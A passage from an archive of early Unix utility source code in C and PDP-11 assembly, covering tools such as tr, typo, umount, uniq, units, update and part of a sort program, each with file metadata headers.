	movb	size0(r1),mss
	bne	2f
	tst	size1(r1)
	beq	1f
2:
	jsr	r5,verify; 'x
		rts pc
	mov	size1(r1),r3
	mov	tapea(r1),r0
	jsr	pc,rseek
	sys	unlink; name
	mov	mode(r1),0f
	sys	0; 9f
.data
9:
	sys	creat; name; 0:..
.text
	bes	crterr
	mov	r0,r2
2:
	tst	mss
	bne	3f
	cmp	r3,$512.
	blo	2f
3:
	jsr	pc,tread
	mov	r2,r0
	sys	write; tapeb; 512.
	bes	crterr1
	cmp	r0,$512.
	bne	crterr1
	sub	r0,r3
	sbc	mss
	br	2b
2:
	mov	r3,0f
	beq	2f
	jsr	pc,tread
	mov	r2,r0
	sys	0; 9f
.data
9:
	sys	write; tapeb; 0:..
.text
	bes	crterr1
	cmp	r0,0b
	bne	crterr1
2:
	mov	r2,r0
	sys	close
	movb	gid(r1),0f+1
	movb	uid(r1),0f
	sys	0; 9f
.data
9:
	sys	chown; name; 0:..
.text
	mov	time0(r1),r0
	mov	r1,-(sp)
	mov	time1(r1),r1
/	sys	0; 9f
.data
9:
	sys	smdate; name
.text
	mov	(sp)+,r1
1:
	rts	pc

crterr1:
	clr	r0
	mov	r1,-(sp)
	clr	r1
/	sys	smdate; name
	mov	(sp)+,r1
	mov	r2,r0
	sys	close

crterr:
	mov	$name,r1
	jsr	pc,pstr
	jsr	r5,mesg
		< -- create error\n\0>; .even
	rts	pc
-- /usr/source/s2/tp4.s mode=0100664 uid=3 gid=3 atime=174923780 mtime=169260601 --
/ tap4 -- dec-tape lod/dmp

.data
tc:	</dev/tap>
tcx:	<x\0>
mt:	</dev/mt>
mtx:	<0\0>
tboot:	</usr/mdec/tboot\0>
mboot:	</usr/mdec/mboot\0>
.even
.bss
dir:	. = .+[mdirent*dirsiz]
tapeb:
map:	.=.+4096.
emap:
ch:	.=.+1
flc:	.=.+1
flf:	.=.+1
fli:	.=.+1
flm:	.=.+1
flu:	.=.+1
flv:	.=.+1
flw:	.=.+1
.even

command:.=.+2
sum:	.=.+2
size:	.=.+2
nentr:	.=.+2
nused:	.=.+2
nfree:	.=.+2
lused:	.=.+2
catlb:	.=.+20.
narg:	.=.+2
rnarg:	.=.+2
parg:	.=.+2
fio:	.=.+2
mss:	.=.+2
ndirent:.=.+2
ndentd8:.=.+2
edir:	.=.+2
rseeka:	.=.+2
wseeka:	.=.+2
tapsiz:	.=.+2
name:	.=.+32.
name1:	.=.+32.
statb:	.=.+40.

smdate = 30.
-- /usr/source/s2/tr.c mode=0100664 uid=3 gid=3 atime=174923790 mtime=169260601 --
int dflag 0;
int sflag 0;
int cflag 0;
int save 0;
char code[256];
char squeez[256];
char vect[256];
struct string { int last, max, rep; char *p; } string1, string2;
int inbuf[259];

main(argc,argv)
char **argv;
{
	int i, j;
	int c, d;
	char *compl;
	extern fout;

	string1.last = string2.last = 0;
	string1.max = string2.max = 0;
	string1.rep = string2.rep = 0;
	string1.p = string2.p = "";

	if(--argc>0) {
		argv++;
		if(*argv[0]=='-'&&argv[0][1]!=0) {
			while(*++argv[0])
				switch(*argv[0]) {
				case 'c':
					cflag++;
					continue;
				case 'd':
					dflag++;
					continue;
				case 's':
					sflag++;
					continue;
				}
			argc--;
			argv++;
		}
	}
	if(argc>0) string1.p = argv[0];
	if(argc>1) string2.p = argv[1];
	for(i=0; i<256; i++)
		code[i] = vect[i] = 0;
	if(cflag) {
		while(c = next(&string1))
			vect[c&0377] = 1;
		j = 0;
		for(i=1; i<256; i++)
			if(vect[i]==0) vect[j++] = i;
		vect[j] = 0;
		compl = vect;
	}
	for(i=0; i<256; i++)
		squeez[i] = 0;
	for(;;){
		if(cflag) c = *compl++;
		else c = next(&string1);
		if(c==0) break;
		d = next(&string2);
		if(d==0) d = c;
		code[c&0377] = d;
		squeez[d&0377] = 1;
	}
	while(d = next(&string2))
		squeez[d&0377] = 1;
	squeez[0] = 1;
	for(i=0;i<256;i++) {
		if(code[i]==0) code[i] = i;
		else if(dflag) code[i] = 0;
	}

	inbuf[0] = 0;
	fout = dup(1);
	close(1);
	while((c=getc(inbuf)) >=0 ) {
		if(c == 0) continue;
		if(c = code[c&0377]&0377)
			if(!sflag || c!=save || !squeez[c&0377])
				putchar(save = c);
	}
	flush();
}

next(s)
struct string *s;
{
	int a, b, c, n;
	int base;

	if(--s->rep > 0) return(s->last);
	if(s->last < s->max) return(++s->last);
	if(*s->p=='[') {
		nextc(s);
		s->last = a = nextc(s);
		s->max = 0;
		switch(nextc(s)) {
		case '-':
			b = nextc(s);
			if(b<a || *s->p++!=']')
				goto error;
			s->max = b;
			return(a);
		case '*':
			base = (*s->p=='0')?8:10;
			n = 0;
			while((c = *s->p)>='0' && c<'0'+base) {
				n = base*n + c - '0';
				s->p++;
			}
			if(*s->p++!=']') goto error;
			if(n==0) n = 1000;
			s->rep = n;
			return(a);
		default:
		error:
			write(1,"Bad string\n",11);
			exit();
		}
	}
	return(nextc(s));
}

nextc(s)
struct string *s;
{
	int c, i, n;

	c = *s->p++;
	if(c=='\\') {
		i = n = 0;
		while(i<3 && (c = *s->p)>='0' && c<='7') {
			n = n*8 + c - '0';
			i++;
			s->p++;
		}
		if(i>0) c = n;
		else c = *s->p++;
	}
	if(c==0) *--s->p = 0;
	return(c&0377);
}
-- /usr/source/s2/tty.s mode=0100664 uid=3 gid=3 atime=174923802 mtime=169260601 --
/ tty -- get tty number

.globl	ttyn

	clr	r0
	jsr	pc,ttyn
	movb	r0,nam
	mov	$1,r0
	sys	write; name; 5
	sys	exit

.data
name:
	<tty>
nam:
	<x\n>
.even
-- /usr/source/s2/typo.c mode=0110664 uid=3 gid=3 atime=174923810 mtime=169260601 --
char number[3];
int eflg;
char w2006[100];
flg 0;
char realwd[100];
char *wd {&realwd[1]};
char *fptr;
char *ffptr &ffbuf;
char ffbuf[36];
int	neng;
int	npr;
int table[2];	/*keep these four cards in order*/
int tab1[26];
int tab2[730];
char tab3[19684];
int logtab[256];
float inctab[256];
char nwd[100];
int tot;
int wtot;
char *buf[3];
file[3];
ptr[3];
char *name[3];
bsp[768];

main(argc,argv) int argc; char *argv[]; {
	char let,lt;
	auto arg,t,sw,i,j,salt,er,c;
	register k,l,m;
	double junk;
	int unl();
	int ii;
	double log(), exp(), pow();

	nice(-20);
	inctab[0] = 1;
	logtab[0] = -10;
	for(ii=1; ii<256; ii++){
		inctab[ii] = exp(-ii/30.497);
		logtab[ii] = log(30.*pow(1.0333,ii+0.) - 30.) + .5;
		}
	logtab[1] = -10;

	number[2] = ' ';
	buf[0] = bsp;
	buf[1] = bsp + 0400;
	buf[2] = bsp + 01000;
	ptr[0] = 0; ptr[1] = 0;
	ptr[2] = 1;
	arg = 1;
	while(argc>1 && argv[arg][0] == '-') {
		switch(argv[arg][1]) {
		default:
			printf("Unrecognizable argument: %c\n",argv[arg][1]);
				exit();
		case 0:
		case 'n':
				neng++;
				break;
		case '1':
				npr++;
		}
		arg++;
		--argc;
	}
	if(!neng) {
		salt = open("/usr/lib/salt",0);
		er = read(salt,table,21200);
			if(er != 21200)err("read salt");
		close(salt);
		}
	if((signal(2,1) & 1) != 1)
	signal(2,unl);
	name[0] = "/usr/tmp/ttmpa1";
	name[1] = "/usr/tmp/ttmpa2";
	name[2] = "/usr/tmp/ttmpa3";
	while((file[0] = open(name[0],1)) > 0){
		close(file[0]);
		for(j=0; j < 3; j++)name[j][13]++;
		if(name[0][13] == 'z')err("creat tmp file");
	}
	file[0] = creat(name[0],0666);
	fptr = argv[arg];
	if(argc == 1) {argc = 2; arg = 0;}
	while(--argc){
		if(arg == 0){
			file[2] = 0;
		}else{
			file[2] = open(argv[arg++],0);
			if(file[2] < 0)err("open input file");
		}
		eflg = 1;
		while((j = wdval(2)) != 0){
			put(0,nwd,j);
			k = -1;
			l = 0;
			m = 1;
			if(inctab[table[0]] > (junk=rand()/32768.)) table[0]++;
			while(m <= j){
				c = 27*wd[k++] + wd[l++];
				if(inctab[tab2[c]] > junk) tab2[c]++;
				c = 27*c + wd[m++];
				if(inctab[tab3[c]] > junk) tab3[c]++;
			}
			c = 27*wd[k] + wd[l];
			if(inctab[tab2[c]] > junk) tab2[c]++;
		}
		if(file[2]) close(file[2]);
	}
	flsh(0,0);
	close(file[0]);
	sw = fork();
		if(sw == 0){execl("/usr/bin/usort","usort","-o",name[2],name[0],0);
			err("sort"); }
		if(sw == -1)err("fork");
	er = wait();
		if(er != sw)err("probs");
	file[0] = creat(name[0],0666);
		if(file[0] < 0)err("creat tmp");
	file[1] = open("/usr/lib/w2006",0);
		if(file[1] < 0)err("open w2006");
	ptr[1] = 1;
	for(k=0;((c = w2006[k] = get(1)) != '\n');k++)
		if(c == -1) break;
	file[2] = open(name[2],0);
	if(file[2] < 0)err("open tmp");
	ptr[2] = 1;

	while(ptr[2]){
		l=0;
		for(k=0;((c = wd[k] = get(2)) != '\n');k++)
			if(c == -1)goto done;
		for(i=0; i<=k;i++){
			if(wd[i] < w2006[l]){
				put(0,wd,k);
				break;
			}
			if(wd[i] > w2006[l]){
				for(l=0;((c = w2006[l] = get(1)) != '\n');l++)
				if(c == -1){
					put(0,wd,k);
					for(k=0;((c = wd[k] =get(2))!= -1);k++){
						put(0,wd,k);
						k = -1;
					}
					goto done;
				}
				i = -1;
				l=0;
				continue;
			}
			l++;
		}
	}
done:
	close(file[2]); 
	unlink(name[2]);
	flsh(0,0);
	close(file[1]);
	close(file[0]);
	ptr[1] = 1;
	file[1] = open(name[0],0);
		if(file[1] < 0)err("open tmp ");
	file[0] = creat(name[1],0666);
		if(file[0] < 0)err("create tmp");
	while((j = nwdval(1)) != 0){
		wtot = 0;
		flg = 0;
		k = -1; l = 0; m = 1;
		while(m <= j){
			tot = 0;
			c = wd[k++]*27 + wd[l++];
			tot =+ (logtab[tab2[c]]+logtab[tab2[wd[k]*27+wd[l]]]);
			tot =>> 1;
			c = c*27 + wd[m++];
			tot =- logtab[tab3[c] & 0377];
			if(tot > wtot) wtot = tot;
			}
		if(wtot < 0) wtot = 0;
		t = conf(wtot,2,number);
		put(0,number,2);
		put(0,nwd,j);
		}
	flsh(0,0);
	close(file[1]);
	close(file[0]);

	sw = fork();
		if(sw == 0){execl("/bin/sort","sort","+0nr", "+1","-o",name[1],name[1]
			,0);
			err("sort"); }
		if(sw == -1)err("fork");
	er = wait();
		if(er != sw)err("prob");

	sw = fork();
		if(sw == 0){
			if(npr) {
				execl("/bin/cat","cat",name[1],0);
			} else {
				i = 0 ;
				while((c = "Possible typo's in "[i++])!=0)
					*ffptr++ = c;
				i = 0;
				while((c = fptr[i++]) != 0)
					*ffptr++ = c;
				*ffptr = 0;
				execl("/bin/pr","pr","-3", "-h",
				ffbuf,name[1],0);
				err("pr");
		}
	}
		if(sw == -1)err("fork");
	er = wait();
		if(er != sw)err("prob");
	unl();
}

unl() {
	register j;
	j = 2;
	while(j--)unlink(name[j]);
	exit();
}


err(c) char c[];{
	register j;
	printf("cannot %s\n",c);
	unl();
}

get(ifile) int ifile;{
	static char *ibuf[10];
	if(--ptr[ifile]){
		return(*ibuf[ifile]++ & 0377);}
	if(ptr[ifile] = read(file[ifile],buf[ifile],512)){
		if(ptr[ifile] < 0)goto prob;
		ibuf[ifile] = buf[ifile];
		return(*ibuf[ifile]++ & 0377);
	}
	ptr[ifile] = 1;
	return(-1);

prob:
	ptr[ifile] = 1;
	printf("read error\n");
	return(-1);
}

put(ofile,s,optr) char s[]; {
	register i;

	while(optr-- >= 0)
		 buf[ofile][(ptr[ofile] < 512)?ptr[ofile]++:flsh(ofile,1)] = *s++;
	return;
}

flsh(ofile,i){
	register error;
	error = write(file[ofile],buf[ofile],ptr[ofile]);
	if(error < 0)goto prob;

	ptr[ofile] = i;
	return(0);
prob:
	printf("write error on t.%d\n",file[ofile]);
	unl();
}

wdval(wfile) int wfile; {
	static let,wflg;
	register j;
beg:
	j = -1;
	if(wflg == 1){wflg = 0;
		goto st; }
	while((let = get(wfile)) != '\n'){
st:
		switch(let){
		case -1:	return(0);
		case '%':	if(j != -1)break;
					goto ret;
		case '-':
				if((let = get(wfile)) == '\n'){
					while((let = get(wfile)) == '\n')if(let == -1)return(0);
					goto st; }
				else {wflg = 1;
					goto ret; }
		case '\'':
				if(eflg != 1){
					if(j < 1)goto beg;
						else break;
					}
		case '.':
				if(eflg == 1){
					while((let = get(wfile)) != '\n')if(let == -1)return(0);
					goto beg; }
				else goto ret;
		default:
				eflg = 0;
				if(let < 'A')goto ret;
				if(let <= 'Z'){ wd[++j] = let - 0100;
					nwd[j] = let + ' ';
					break; }
				if(let < 'a' || let > 'z')goto ret;
				wd[++j] = let - 0140;
				nwd[j] = let;
			}
		 eflg = 0;	}

	eflg = 1;
ret:
	if(j < 1)goto beg;
	nwd[++j] = '\n';
	wd[j] = 0;
	return(j);
}

nwdval(wfile) int wfile;{
	register j;
	register char c;
	j = -1;
	do{
		if(( c = nwd[++j] = get(wfile)) == -1)return(0);
		wd[j] = c - 0140;
	}
	while(c != '\n');
	wd[j] = '\0';
	return(j);
}
conf(n,width,cbuf) char cbuf[]; {
	register i,a;

	i = width;
	while(i--)cbuf[i] = ' ';

	cbuf[(a = n/10)?conf(a,--width,cbuf):--width] = n%10 + '0';

	return(++width);
}
rand(){
	static gorp;
	gorp = (gorp + 625) & 077777;
	return(gorp);
}
-- /usr/source/s2/umount.c mode=0100664 uid=3 gid=3 atime=174923833 mtime=169260601 --
#define	NMOUNT	16
#define	NAMSIZ	32

struct mtab {
	char	file[NAMSIZ];
	char	spec[NAMSIZ];
} mtab[NMOUNT];

main(argc, argv)
char **argv;
{
	register struct mtab *mp;
	register char *p1, *p2;
	int mf;

	sync();
	mf = open("/etc/mtab", 0);
	read(mf, mtab, NMOUNT*2*NAMSIZ);
	if(argc != 2) {
		printf("arg count\n");
		return;
	}
	if (umount(argv[1]) < 0) {
		perror("umount");
		return;
	}
	p1 = argv[1];
	while(*p1++)
		;
	p1--;
	while(*--p1 == '/')
		*p1 = '\0';
	while(p1 > argv[1] && *--p1 != '/')
		;
	if(*p1 == '/')
		p1++;
	argv[1] = p1;
	for (mp = mtab; mp < &mtab[NMOUNT]; mp++) {
		p1 = argv[1];
		p2 = &mp->spec[0];
		while (*p1++ == *p2)
			if (*p2++ == 0) {
				for (p1 = mp->file; p1 < &mp->file[NAMSIZ*2];)
					*p1++ = 0;
				mp = &mtab[NMOUNT];
				while ((--mp)->file[0] == 0);
				mf = creat("/etc/mtab", 0644);
				write(mf, mtab, (mp-mtab+1)*2*NAMSIZ);
				return;
			}
	}
	printf("%s not in mount table\n", argv[1]);
}
-- /usr/source/s2/uniq.c mode=0100664 uid=3 gid=3 atime=174923845 mtime=169260601 --
fields 0;
letters 0;
linec;
mode;
uniq;

main(argc, argv)
int argc;
char *argv[];
{
	extern fin, fout;
	int f;
	static char b1[1000], b2[1000];

loop:
	if(argc > 1) {
		if(*argv[1] == '-') {
			if(argv[1][1] <= '9')
				fields = conv(&argv[1][1]);
			else mode = argv[1][1];
			argc--;
			argv++;
			goto loop;
		}
		if(*argv[1] == '+') {
			letters = conv(&argv[1][1]);
			argc--;
			argv++;
			goto loop;
		}
		f = open(argv[1], 0);
		if(f < 0) {
			printf("cannot open %s\n", argv[1]);
			exit();
		}
		fin = f;
	} else
		fin = dup(0);
	if(argc > 2) {
		f = creat(argv[2], 0666);
		if(f < 0) {
			printf("cannot create %s\n", argv[2]);
			exit();
		}
		fout = f;
	} else
		fout = dup(1);
	close(0);
	close(1);
	gline(b1);
l1:
	linec++;
	if(gline(b2)) {
		pline(b1);
		flush();
		exit();
	}
	if(equal(b1, b2)) goto l1;
	pline(b1);
	linec = 0;
l2:
	linec++;
	if(gline(b1)) {
		pline(b2);
		flush();
		exit();
	}
	if(equal(b1, b2)) goto l2;
	pline(b2);
	linec = 0;
	goto l1;
}

gline(buf)
char buf[];
{
	int c;

	while((c = getchar()) != '\n') {
		if(c == '\0')
			return(1);
		*buf++ = c;
	}
	*buf = 0;
	return(0);
}

pline(buf)
char buf[];
{
	int c;

	switch(mode) {

	case 'u':
		if(uniq) {;
			uniq = 0;
			return;
		}
		break;

	case 'd':
		if(uniq) break;
		return;

	case 'c':
		printf("%4d ", linec);
	}
	uniq = 0;
	while((c = *buf++) != 0)
		putchar(c);
	putchar('\n');
}

equal(b1, b2)
char b1[], b2[];
{
	int c;

	b1 = skip(b1);
	b2 = skip(b2);
	while((c = *b1++) != 0)
		if(c != *b2++) return(0);
	if(*b2 != 0)
		return(0);
	uniq++;
	return(1);
}

char *
skip(s)
char *s;
{
	int nf, nl;

	nf = nl = 0;
	while(nf++ < fields) {
		while(*s==' ' || *s=='\t')
			s++;
		while( !(*s==' ' || *s=='\t') ) 
			if(*s == 0) return(s);
			else s++;
	}
	while(nl++ < letters) 
			if(*s == 0) return(s);
			else s++;
	return(s);
}

conv(s)
char *s;
{
	int d, n;

	n = 0;
	for(;;) {
		d = *s++ - '0';
		if(0>d || d>9) break;
		n = n*10 + d;
	}
	return(n);
}
-- /usr/source/s2/units.c mode=0110664 uid=3 gid=3 atime=174923858 mtime=169260601 --
#define	NDIM	10
#define	NTAB	601
char	*dfile	"/usr/lib/units";
char	*unames[NDIM];
double	getflt();
int	fperr();
struct unit
{
	double	factor;
	char	dim[NDIM];
};

struct table
{
	double	factor;
	char	dim[NDIM];
	char	*name;
} table[NTAB];
char	names[NTAB*10];
struct prefix
{
	double	factor;
	char	*pname;
} prefix[]
{
	1e-18,	"atto",
	1e-15,	"femto",
	1e-12,	"pico",
	1e-9,	"nano",
	1e-6,	"micro",
	1e-3,	"milli",
	1e-2,	"centi",
	1e-1,	"deci",
	1e1,	"deka",
	1e2,	"hecta",
	1e2,	"hecto",
	1e3,	"kilo",
	1e6,	"mega",
	1e6,	"meg",
	1e9,	"giga",
	1e12,	"tera",
	0.0,	0
};
int	ibuf[259];
int	fperrc;
int	peekc;
int	dumpflg;

main(argc, argv)
char *argv[];
{
	register i;
	register char *file;
	struct unit u1, u2;
	double f;

	if(argc>1 && *argv[1]=='-') {
		argc--;
		argv++;
		dumpflg++;
	}
	file = dfile;
	if(argc > 1)
		file = argv[1];
	if(fopen(file, ibuf) < 0) {
		printf("no table\n");
		exit();
	}
	ldfps(07600); /* interrupt on fp errors */
	signal(8, fperr);
	init();
	close(ibuf[0]);
	ibuf[0] = 0;

loop:
	fperrc = 0;
	printf("you have: ");
	if(convr(&u1))
		goto loop;
	if(fperrc)
		goto fp;
loop1:
	printf("you want: ");
	if(convr(&u2))
		goto loop1;
	for(i=0; i<NDIM; i++)
		if(u1.dim[i] != u2.dim[i])
			goto conform;
	f = u1.factor/u2.factor;
	if(fperrc)
		goto fp;
	printf("\t* %e\n", f);
	printf("\t/ %e\n", 1./f);
	goto loop;

conform:
	if(fperrc)
		goto fp;
	printf("conformability\n");
	units(&u1);
	units(&u2);
	goto loop;

fp:
	printf("underflow or overflow\n");
	goto loop;
}

units(up)
struct unit *up;
{
	register struct unit *p;
	register f, i;

	p = up;
	printf("\t%e ", p->factor);
	f = 0;
	for(i=0; i<NDIM; i++)
		f =| pu(p->dim[i], i, f);
	if(f&1) {
		putchar('/');
		f = 0;
		for(i=0; i<NDIM; i++)
			f =| pu(-p->dim[i], i, f);
	}
	putchar('\n');
}

pu(u, i, f)
{

	if(u > 0) {
		if(f&2)
			putchar('-');
		if(unames[i])
			printf("%s", unames[i]); else
			printf("*%c*", i+'a');
		if(u > 1)
			putchar(u+'0');
			return(2);
	}
	if(u < 0)
		return(1);
	return(0);
}

convr(up)
struct unit *up;
{
	register struct unit *p;
	register c;
	register char *cp;
	char name[20];
	int den, err;

	p = up;
	for(c=0; c<NDIM; c++)
		p->dim[c] = 0;
	p->factor = getflt();
	if(p->factor == 0.)
		p->factor = 1.0;
	err = 0;
	den = 0;
	cp = name;

loop:
	switch(c=get()) {

	case '1':
	case '2':
	case '3':
	case '4':
	case '5':
	case '6':
	case '7':
	case '8':
	case '9':
	case '-':
	case '/':
	case ' ':
	case '\t':
	case '\n':
		if(cp != name) {
			*cp++ = 0;
			cp = name;
			err =| lookup(cp, p, den, c);
		}
		if(c == '/')
			den++;
		if(c == '\n')
			return(err);
		goto loop;
	}
	*cp++ = c;
	goto loop;
}

lookup(name, up, den, c)
char *name;
struct unit *up;
{
	register struct unit *p;
	register struct table *q;
	register i;
	char *cp1, *cp2;
	double e;

	p = up;
	e = 1.0;

loop:
	q = hash(name);
	if(q->name) {
		l1:
		if(den) {
			p->factor =/ q->factor*e;
			for(i=0; i<NDIM; i++)
				p->dim[i] =- q->dim[i];
		} else {
			p->factor =* q->factor*e;
			for(i=0; i<NDIM; i++)
				p->dim[i] =+ q->dim[i];
		}
		if(c >= '2' && c <= '9') {
			c--;
			goto l1;
		}
		return(0);
	}
	for(i=0; cp1 = prefix[i].pname; i++) {
		cp2 = name;
		while(*cp1 == *cp2++)
			if(*cp1++ == 0) {
				cp1--;
				break;
			}
		if(*cp1 == 0) {
			e =* prefix[i].factor;
			name = cp2-1;
			goto loop;
		}
	}
	for(cp1 = name; *cp1; cp1++);
	if(cp1 > name+1 && *--cp1 == 's') {
		*cp1 = 0;
		goto loop;
	}
	printf("cannot recognize %s\n", name);
	return(1);
}

equal(s1, s2)
char *s1, *s2;
{
	register char *c1, *c2;

	c1 = s1;
	c2 = s2;
	while(*c1++ == *c2)
		if(*c2++ == 0)
			return(1);
	return(0);
}

init()
{
	register char *cp;
	register struct table *tp, *lp;
	int c, i, f, t;
	char *np;

	cp = names;
	for(i=0; i<NDIM; i++) {
		np = cp;
		*cp++ = '*';
		*cp++ = i+'a';
		*cp++ = '*';
		*cp++ = 0;
		lp = hash(np);
		lp->name = np;
		lp->factor = 1.0;
		lp->dim[i] = 1;
	}
	lp = hash("");
	lp->name = cp-1;
	lp->factor = 1.0;

l0:
	c = get();
	if(c == 0) {
		printf("%l units; %l bytes\n\n", i, cp-names);
		if(dumpflg)
		for(tp = &table[0]; tp < &table[NTAB]; tp++) {
			if(tp->name == 0)
				continue;
			printf("%s", tp->name);
			units(tp);
		}
		return;
	}
	if(c == '/')
		while(c != '\n')
			c = get();
	if(c == '\n')
		goto l0;
	np = cp;
	while(c != ' ' && c != '\t') {
		*cp++ = c;
		c = get();
		if(c == '\n') {
			*cp++ = 0;
			tp = hash(np);
			if(tp->name)
				goto redef;
			tp->name = np;
			tp->factor = lp->factor;
			for(c=0; c<NDIM; c++)
				tp->dim[c] = lp->dim[c];
			i++;
			goto l0;
		}
	}
	*cp++ = 0;
	lp = hash(np);
	if(lp->name)
		goto redef;
	convr(lp);
	lp->name = np;
	f = 0;
	i++;
	if(lp->factor != 1.0)
		goto l0;
	for(c=0; c<NDIM; c++) {
		t = lp->dim[c];
		if(t>1 || (f>0 && t!=0))
			goto l0;
		if(f==0 && t==1) {
			if(unames[c])
				goto l0;
			f = c+1;
		}
	}
	if(f>0)
		unames[f-1] = np;
	goto l0;

redef:
	printf("redefination %s\n", np);
	goto l0;
}

double
getflt()
{
	register c, i, dp;
	double d, e;
	int f;

	d = 0.;
	dp = 0;
	do
		c = get();
	while(c == ' ' || c == '\t');

l1:
	if(c >= '0' && c <= '9') {
		d = d*10. + c-'0';
		if(dp)
			dp++;
		c = get();
		goto l1;
	}
	if(c == '.') {
		dp++;
		c = get();
		goto l1;
	}
	if(dp)
		dp--;
	if(c == '+' || c == '-') {
		f = 0;
		if(c == '-')
			f++;
		i = 0;
		c = get();
		while(c >= '0' && c <= '9') {
			i = i*10 + c-'0';
			c = get();
		}
		if(f)
			i = -i;
		dp =- i;
	}
	e = 1.;
	i = dp;
	if(i < 0)
		i = -i;
	while(i--)
		e =* 10.;
	if(dp < 0)
		d =* e; else
		d =/ e;
	if(c == '|')
		return(d/getflt());
	peekc = c;
	return(d);
}

get()
{
	register c;

	if(c=peekc) {
		peekc = 0;
		return(c);
	}
	c = getc(ibuf);
	if(c <= 0) {
		if(ibuf[0])
			return(0);
		printf("\n");
		exit();
	}
	return(c);
}

hash(name)
char *name;
{
	register struct table *tp;
	register char *np;
	register h;

	h = 0;
	np = name;
	while(*np)
		h = h*57 + *np++ - '0';
	h = lrem(0, h, NTAB);
	tp = &table[h];
l0:
	if(tp->name == 0)
		return(tp);
	if(equal(name, tp->name))
		return(tp);
	tp++;
	if(tp >= &table[NTAB])
		tp = table;
	goto l0;
}

fperr()
{

	signal(8, fperr);
	fperrc++;
}
-- /usr/source/s2/update.s mode=0100664 uid=3 gid=3 atime=174923879 mtime=169260601 --
	sys	fork
		br 1f
	sys	exit
1:
	clr	r0
	sys	close
	mov	$1,r0
	sys	close
	mov	$2,r0
	sys	close
1:
	sys	sync
	mov	$30.,r0
	sys	sleep
	br	1b
sleep = 35.
sync = 36.
-- /usr/source/s2/usort.c mode=0110664 uid=3 gid=3 atime=174923883 mtime=169260601 --
#define	L	512
#define	N	7
#define	C	20
#define	MEM	(16*2048)
#define NF	10

int	ibuf[259];
int	obuf[259];
char	*file;
char	*filep;
int	nfiles;
int	nlines;
int	ntext;
int	*lspace;
char	*tspace;
int	cmp();
int	term();
int 	mflg;
char	*outfil;
char	tabchar;
int 	eargc;
char	**eargv;

char	fold[128] {
	0000,0001,0002,0003,0004,0005,0006,0007,
	0010,0011,0012,0013,0014,0015,0016,0017,
	0020,0021,0022,0023,0024,0025,0026,0027,
	0030,0031,0032,0033,0034,0035,0036,0037,
	0040,0041,0042,0043,0044,0045,0046,0047,
	0050,0051,0052,0053,0054,0055,0056,0057,
	0060,0061,0062,0063,0064,0065,0066,0067,
	0070,0071,0072,0073,0074,0075,0076,0077,
	0100,0101,0102,0103,0104,0105,0106,0107,
	0110,0111,0112,0113,0114,0115,0116,0117,
	0120,0121,0122,0123,0124,0125,0126,0127,
	0130,0131,0132,0133,0134,0134,0136,0137,
	0140,0101,0102,0103,0104,0105,0106,0107,
	0110,0111,0112,0113,0114,0115,0116,0117,
	0120,0121,0122,0123,0124,0125,0126,0127,
	0130,0131,0132,0173,0174,0175,0176,0177
};
char	nofold[128];
char	dict[128] {
	1,1,1,1,1,1,1,1,1,0,0,1,1,1,1,1,
	1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
	0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
	0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,
	1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,
	1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
	0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1
};
char	nodict[128] { 1 };

struct	field {
	char *code;
	char *ignore;
	int nflg;
	int rflg;
	int bflg;
	char *m[2];
	char *n[2];
}	fields[NF];
int proto[9] {
	&fold,
	&nodict,
	0,
	1,
	0,
	0,-1,
	0,0
};
int	nfields;
int 	error 1;

main(argc, argv)
char **argv;
{
	register a, i;
	char *arg;
	register int *p;
	int *q;

	for(a=0; a<128; a++)
		nofold[a] = a;
	nodict[127] = 1;
	copyproto();
	eargv = argv;
	while (--argc > 0) {
		if(**++argv == '-') for(arg = *argv;;) {
			switch(*++arg) {
			case '\0':
				if(arg[-1] == '-')
					eargv[eargc++] = "-";
				break;

			case 'm':
				mflg++;
				continue;

			case 'o':
				if(--argc > 0)
					outfil = *++argv;
				continue;

			default:
				field(++*argv,1);
				break;
			}
			break;
		} else if (**argv == '+') {
			if(++nfields>=NF) {
				mess("Too many keys\n");
				exit(1);
			}
			copyproto();
			field(++*argv,0);
		} else
			eargv[eargc++] = *argv;
	}
	q = &fields[0];
	for(a=1; a<=nfields; a++) {
		p = &fields[a];
		for(i=0; i<5; i++)	/*sensitive to sizeof(proto)*/
			if(p[i] != proto[i])
				goto next;
		for(i=0; i<5; i++)
			p[i] = q[i];
next:	;
	}
	if(eargc == 0)
		eargv[eargc++] = "-";

	a = MEM;
	i = lspace = sbrk(0);
	while(brk(a) == -1)
		a =- 512;
	brk(a =- 512);	/* for recursion */
	a =- i;
	nlines = ((a-L)>>1) & 077777;
	nlines =/ 5;
	ntext = nlines*8;
	tspace = lspace+nlines;
	file = "/usr/tmp/stmXaa";
loop:
	filep = file;
	while(*filep != 'X')
		filep++;
	for(*filep = 'a';;(*filep)++) {
		if(stat(file, lspace) < 0) {
			a = creat(file, 0600);
			if(a >= 0)
				break;
		}
		if(*filep == 'z') {
			if(file[1] != 't') {
				file = "/tmp/stmXaa";
				goto loop;
			}
			mess("Cannot locate temp\n");
			exit(1);
		}
	}
	close(a);
	filep++;
	if ((signal(2, 1) & 01) == 0)
		signal(2, term);
	nfiles = eargc;
	if(!mflg) {
		ibuf[0] = -1;
		sort();
		close(0);
	}
	for(a = mflg?0:eargc; a+N < nfiles; a=+N) {
		newfile();
		merge(a, a+N);
	}
	if(a != nfiles) {
		oldfile();
		merge(a, nfiles);
	}
	error = 0;
	term();
}

sort()
{
	register char *cp;
	register *lp, c;
	int done;
	int i;
	int f;

	done = 0;
	i = 0;
	do {
		cp = tspace;
		lp = lspace;
		while(lp < lspace+nlines && cp < tspace+ntext) {
			*lp++ = cp;
			while((*cp++ = c = getc(ibuf)) != '\n') {
				if(c >= 0) continue;
				cp--;
				close(ibuf[0]);
				if(i < eargc) {
					if((f = setfil(i++)) == 0)
						ibuf[0] = 0;
					else if(fopen(f, ibuf) < 0)
						cant(f);
				} else
					break;
			}
			if(c < 0) {
				done++;
				lp--;
				break;
			}
		}
		qsort(lspace, lp-lspace, 2, cmp);
		if(done == 0 || nfiles != eargc)
			newfile(); else
			oldfile();
		while(lp > lspace) {
			cp = *--lp;
			if(*cp)
				do
				putc(*cp, obuf);
				while(*cp++ != '\n');
		}
		fflush(obuf);
		close(obuf[0]);
	} while(done == 0);
}

